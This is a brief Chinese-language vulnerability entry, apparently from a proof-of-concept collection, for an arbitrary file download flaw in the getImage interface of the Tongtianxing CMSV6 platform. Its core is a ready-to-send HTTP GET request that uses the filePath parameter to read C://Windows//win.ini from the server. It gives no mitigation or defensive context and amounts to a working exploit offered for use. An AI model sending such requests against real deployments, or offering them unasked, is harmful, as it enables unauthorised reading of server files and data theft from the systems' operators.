**漏洞描述：**

通天星CMSV6接口StandardReportMediaAction_getImage存在任意文件下载，攻击者可以利用接口下载服务器数据文件。

**影响版本：**

通天星CMSV6

**Payload：**

```
GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
Host: 192.168.52.130
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

---
